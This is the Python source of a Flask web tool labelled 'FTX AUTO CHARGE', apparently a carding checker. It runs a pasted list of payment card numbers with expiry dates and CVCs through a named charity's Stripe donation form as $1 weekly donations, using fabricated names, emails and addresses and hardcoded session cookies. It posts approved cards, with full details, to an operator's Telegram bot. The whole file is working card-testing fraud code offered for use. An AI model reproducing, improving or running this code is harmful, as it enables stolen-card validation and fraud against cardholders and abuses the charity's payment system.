import os, json, re, random, string, time
from flask import Flask, request, render_template_string, jsonify
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FTX Stripe Processor</title>
    <link href="https://fonts.googleapis.com/css2?family=Dangrek&family=Battambang:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body {
            font-family: 'Battambang';
            background: #0f172a;
            color: #e2e8f0;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: #1e293b;
            border-radius: 16px;
            border: 1px solid #334155;
        }
        .ftx-title {
            font-family: 'Dangrek';
            font-size: 3rem;
            background: linear-gradient(90deg, #ef4444, #f97316);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 10px 0;
        }
        .subtitle {
            color: #94a3b8;
            font-size: 1.2rem;
        }
        .panel {
            background: #1e293b;
            border-radius: 16px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid #334155;
        }
        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            background: #0f172a;
            border: 1px solid #475569;
            border-radius: 8px;
            color: #e2e8f0;
            font-size: 1rem;
            margin-bottom: 15px;
            box-sizing: border-box;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #3b82f6;
        }
        button {
            background: linear-gradient(90deg, #dc2626, #ea580c);
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(220, 38, 38, 0.3);
        }
        .logs {
            background: #0f172a;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
            height: 400px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 0.9rem;
            border: 1px solid #334155;
        }
        .log-line {
            padding: 5px 0;
            border-bottom: 1px solid #334155;
        }
        .success { color: #22c55e; }
        .error { color: #ef4444; }
        .warning { color: #f59e0b; }
        .info { color: #3b82f6; }
        .status {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            margin-left: 10px;
        }
        .running { background: #065f46; color: #34d399; }
        .stopped { background: #7f1d1d; color: #fca5a5; }
        .stats {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            margin-top: 20px;
        }
        .stat-box {
            background: #0f172a;
            padding: 15px;
            border-radius: 8px;
            flex: 1;
            min-width: 150px;
            text-align: center;
            border: 1px solid #334155;
        }
        .stat-value {
            font-size: 2rem;
            font-weight: bold;
            color: #f97316;
        }
        .stat-label {
            color: #94a3b8;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="ftx-title">FTX AUTO CHARGE</div>
            <div class="subtitle">Stripe Donate 1$ Processor | Dev: @Mast4rcard</div>
        </div>

        <div class="panel">
            <h2>Configuration</h2>
            <div class="form-grid">
                <div>
                    <label>CC List (one per line)</label>
                    <textarea id="ccList" rows="10" placeholder="1234567890123456|12|25|123"></textarea>
                </div>
                <div>
                    <label>Telegram Bot Token (Optional)</label>
                    <input type="text" id="botToken" placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11">
                    
                    <label>Telegram Chat ID (Optional)</label>
                    <input type="text" id="chatId" placeholder="123456789">
                    
                    <label>Delay between cards (seconds)</label>
                    <input type="number" id="delay" value="5" min="1" max="60">
                    
                    <div class="stats">
                        <div class="stat-box">
                            <div class="stat-value" id="totalCards">0</div>
                            <div class="stat-label">Total Cards</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-value" id="processedCards">0</div>
                            <div class="stat-label">Processed</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-value" id="successCount">0</div>
                            <div class="stat-label">Success</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-value" id="failCount">0</div>
                            <div class="stat-label">Failed</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div style="display: flex; gap: 15px; margin-top: 20px;">
                <button onclick="startProcessing()">Start Processing</button>
                <button onclick="stopProcessing()" style="background: linear-gradient(90deg, #475569, #64748b);">Stop</button>
                <button onclick="clearLogs()" style="background: linear-gradient(90deg, #334155, #475569);">Clear Logs</button>
            </div>
        </div>

        <div class="panel">
            <h2>Processing Logs <span id="statusIndicator" class="status stopped">STOPPED</span></h2>
            <div class="logs" id="logContainer">
                <!-- Logs will appear here -->
            </div>
        </div>
    </div>

    <script>
        let isProcessing = false;
        let processed = 0;
        let success = 0;
        let fail = 0;
        
        function updateStats() {
            document.getElementById('totalCards').textContent = document.getElementById('ccList').value.split('\\n').filter(l => l.trim()).length;
            document.getElementById('processedCards').textContent = processed;
            document.getElementById('successCount').textContent = success;
            document.getElementById('failCount').textContent = fail;
        }
        
        function addLog(message, type='info') {
            const logContainer = document.getElementById('logContainer');
            const timestamp = new Date().toLocaleTimeString();
            const logLine = document.createElement('div');
            logLine.className = `log-line ${type}`;
            logLine.innerHTML = `[${timestamp}] ${message}`;
            logContainer.appendChild(logLine);
            logContainer.scrollTop = logContainer.scrollHeight;
        }
        
        function updateStatus(running) {
            const indicator = document.getElementById('statusIndicator');
            if (running) {
                indicator.textContent = 'RUNNING';
                indicator.className = 'status running';
            } else {
                indicator.textContent = 'STOPPED';
                indicator.className = 'status stopped';
            }
        }
        
        async function startProcessing() {
            if (isProcessing) {
                addLog('Already processing', 'warning');
                return;
            }
            
            const ccList = document.getElementById('ccList').value.trim();
            if (!ccList) {
                Swal.fire('Error', 'CC list is empty', 'error');
                return;
            }
            
            const cards = ccList.split('\\n').filter(l => l.trim());
            const botToken = document.getElementById('botToken').value.trim();
            const chatId = document.getElementById('chatId').value.trim();
            const delay = parseInt(document.getElementById('delay').value) * 1000;
            
            isProcessing = true;
            updateStatus(true);
            processed = success = fail = 0;
            updateStats();
            
            addLog(`Starting processing of ${cards.length} cards...`, 'info');
            
            for (let i = 0; i < cards.length; i++) {
                if (!isProcessing) break;
                
                const card = cards[i].trim();
                addLog(`Processing card ${i+1}/${cards.length}: ${card}`, 'info');
                
                try {
                    const response = await fetch('/process', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            card: card,
                            botToken: botToken,
                            chatId: chatId,
                            cardNumber: i+1
                        })
                    });
                    
                    const result = await response.json();
                    
                    if (result.success) {
                        addLog(`✓ ${card} | ${result.message}`, 'success');
                        success++;
                    } else {
                        addLog(`✗ ${card} | ${result.message}`, 'error');
                        fail++;
                    }
                    
                    processed++;
                    updateStats();
                    
                } catch (error) {
                    addLog(`✗ ${card} | Network error: ${error.message}`, 'error');
                    fail++;
                    processed++;
                    updateStats();
                }
                
                if (i < cards.length - 1 && isProcessing) {
                    addLog(`Waiting ${delay/1000} seconds before next card...`, 'info');
                    await sleep(delay);
                }
            }
            
            isProcessing = false;
            updateStatus(false);
            addLog(`Processing completed. Success: ${success}, Failed: ${fail}`, 'info');
        }
        
        function stopProcessing() {
            if (isProcessing) {
                isProcessing = false;
                updateStatus(false);
                addLog('Processing stopped by user', 'warning');
            }
        }
        
        function clearLogs() {
            document.getElementById('logContainer').innerHTML = '';
            processed = success = fail = 0;
            updateStats();
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        document.getElementById('ccList').addEventListener('input', updateStats);
        updateStats();
    </script>
</body>
</html>
'''

class StripeProcessor:
    def __init__(self):
        self.session = requests.Session()
    
    def generate_full_name(self):
        first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                      "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                      "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
                      "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha"]
        last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", 
                     "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker"]
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        return first_name, last_name
    
    def generate_email(self):
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@gmail.com"
    
    def generate_phone(self):
        number = ''.join(random.choices(string.digits, k=7))
        return f"303{number}"
    
    def process_card(self, card_data, bot_token=None, chat_id=None):
        try:
            n, mm, yy, cvc = card_data.split('|')
            n = n.strip()
            mm = mm.strip()
            yy = yy.strip().zfill(2)[-2:]
            cvc = cvc.strip().replace('\n', '').replace('\r', '')
            
            first_name, last_name = self.generate_full_name()
            email = self.generate_email()
            
            cookies = {
                'charitable_session': 'c367ed103a782e0e8516bbd5c71ac264||86400||82800',
                '__stripe_mid': 'dd1cf2bd-d793-4dc5-b60e-faf952c9a4731955c1',
                '__stripe_sid': 'b081920f-09ae-4e5a-9521-b0e96396026f5f3300',
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            }
            
            response = self.session.get('https://pipelineforchangefoundation.com/donate/', 
                                      cookies=cookies, headers=headers)
            
            formid = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
            nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
            campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
            pk_live = re.search(r'"key":"(.*?)"', response.text).group(1)
            
            payment_data = f'type=card&billing_details[name]={first_name}+{last_name}&billing_details[email]={email}&billing_details[address][city]=New+york&billing_details[address][country]=US&billing_details[address][line1]=New+york+new+states+1000&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=012434816444&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=beb24868-9013-41ea-9964-7917dbbc35582418cf&muid=dd1cf2bd-d793-4dc5-b60e-faf952c9a4731955c1&sid=911f35c9-ecd0-4925-8eea-5f54c9676f2a227523&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&referrer=https%3A%2F%2Fpipelineforchangefoundation.com&time_on_page=168797&key={pk_live}'
            
            payment_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://js.stripe.com/',
            }
            
            payment_resp = self.session.post('https://api.stripe.com/v1/payment_methods', 
                                           headers=payment_headers, data=payment_data)
            payment_id = payment_resp.json()['id']
            
            donation_data = {
                'charitable_form_id': formid,
                formid: '',
                '_charitable_donation_nonce': nonce,
                '_wp_http_referer': '/donate/',
                'campaign_id': campaign_id,
                'description': 'Donate to Pipeline for Change Foundation',
                'ID': '742502',
                'recurring_donation': 'yes',
                'donation_amount': 'recurring-custom',
                'custom_recurring_donation_amount': '1.00',
                'recurring_donation_period': 'week',
                'custom_donation_amount': '1.00',
                'first_name': 'ftx',
                'last_name': first_name,
                'email': email,
                'address': 'ftxbabatek nea',
                'city': 'new york',
                'state': '100p',
                'postcode': '10080',
                'country': 'US',
                'phone': '02026726732',
                'gateway': 'stripe',
                'stripe_payment_method': payment_id,
                'action': 'make_donation',
                'form_action': 'make_donation',
            }
            
            ajax_headers = {
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Referer': 'https://pipelineforchangefoundation.com/donate/',
            }
            
            final_resp = self.session.post(
                'https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php',
                cookies=cookies,
                headers=ajax_headers,
                data=donation_data,
            )
            
            result_text = final_resp.text
            
            if 'Thank you for your donation' in result_text or 'Thank you' in result_text or 'Successfully' in result_text:
                if bot_token and chat_id:
                    message = f"Stripe Charge Donate1$ ✅\\n━━━━━━━━━━━━━━━━\\n[↯] CC ⇾ {n}|{mm}|{yy}|{cvc}\\n[↯] Gate ⇾ Stripe Charge 1$\\n[↯] Status ⇾ APPROVED ✅\\n[↯] Response ⇾ CHARGED 🟢\\n━━━━━━━━━━━━━━━━\\n[↯] Bot By ⇾ @Mast4rcard"
                    self.session.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                    params={'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'})
                return True, "Charge 1.00$ ✅"
            elif 'requires_action' in result_text:
                return False, "requires_action"
            else:
                error_match = re.search(r'"errors":\s*{.*?"message":\s*"([^"]+)"', result_text)
                error_msg = error_match.group(1) if error_match else "Unknown error"
                return False, error_msg
                
        except Exception as e:
            return False, f"Processing error: {str(e)}"

processor = StripeProcessor()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/process', methods=['POST'])
def process():
    data = request.json
    card = data.get('card', '')
    bot_token = data.get('botToken', '')
    chat_id = data.get('chatId', '')
    
    success, message = processor.process_card(card, bot_token, chat_id)
    
    return jsonify({
        'success': success,
        'message': message,
        'card': card
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
